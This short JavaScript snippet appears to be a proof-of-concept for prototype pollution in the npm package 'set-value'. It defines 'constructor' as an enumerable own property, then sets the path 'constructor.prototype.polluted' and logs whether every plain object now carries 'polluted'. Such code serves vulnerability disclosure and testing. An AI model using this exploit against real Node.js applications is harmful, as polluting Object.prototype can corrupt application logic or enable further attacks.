var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const setFn = require('set-value');
const paths = ['constructor.prototype.polluted'];
var obj = {};
console.log({}.polluted);
setFn(obj, paths[0], 'yes');
console.log({}.polluted);